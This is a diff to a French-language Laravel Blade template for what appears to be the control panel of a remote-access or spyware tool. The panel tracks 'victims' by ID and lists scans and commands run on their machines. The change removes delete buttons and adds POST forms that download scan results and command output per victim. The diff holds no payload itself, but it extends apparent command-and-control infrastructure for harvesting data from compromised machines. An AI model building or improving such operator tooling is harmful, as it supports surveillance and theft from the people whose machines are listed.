@@ -159,7 +159,6 @@
                                                                 <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                                                 <button type="submit" class="btn btn-success">Télécharger</button>
                                                             </form>
-                                                            <button type="button" class="btn btn-danger">Supprimer</button>
                                                         </td>
                                                     </tr>
                                                 @endforeach
@@ -212,7 +211,6 @@
                                                                 <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                                                 <button type="submit" class="btn btn-success">Télécharger</button>
                                                             </form>
-                                                            <button type="button" class="btn btn-danger">Supprimer</button>
                                                         </td>
                                                     </tr>
                                                 @endforeach
@@ -268,7 +266,6 @@
                                                                 <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                                                 <button type="submit" class="btn btn-success">Télécharger</button>
                                                             </form>
-                                                            <button type="button" class="btn btn-danger">Supprimer</button>
                                                         </td>
                                                     </tr>
                                                 @endforeach
@@ -324,8 +321,12 @@
                                                         <td>{{ $scan->created_at->format('H:i') }}</td>
                                                         <td>{{ $scan->created_at->format('d/m/Y') }}</td>
                                                         <td>
-                                                            <button type="button" class="btn btn-success">Télécharger</button>
-                                                            <button type="button" class="btn btn-danger">Supprimer</button>
+                                                            <form method="POST" action="/scan/dl">
+                                                                @csrf
+                                                                <input type="hidden" name="scan_id" value="{{ $scan->id }}">
+                                                                <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
+                                                                <button type="submit" class="btn btn-success">Télécharger</button>
+                                                            </form>
                                                         </td>
                                                     </tr>
                                                 @endforeach
@@ -381,7 +382,6 @@
                                                                 <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                                                 <button type="submit" class="btn btn-success">Télécharger</button>
                                                             </form>
-                                                            <button type="button" class="btn btn-danger">Supprimer</button>
                                                         </td>
                                                     </tr>
                                                 @endforeach
@@ -497,7 +497,12 @@
                                                         <td>{{ $command->created_at->format('H:i') }}</td>
                                                         <td>{{ $command->created_at->format('d/m/Y') }}</td>
                                                         <td>
-                                                            <button type="button" class="btn btn-success">Télécharger</button>
+                                                            <form method="POST" action="/cmd/dl">
+                                                                @csrf
+                                                                <input type="hidden" name="command_id" value="{{ $command->id }}">
+                                                                <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
+                                                                <button type="submit" class="btn btn-success">Télécharger</button>
+                                                            </form>
                                                         </td>
                                                     </tr>
                                                 @endforeach
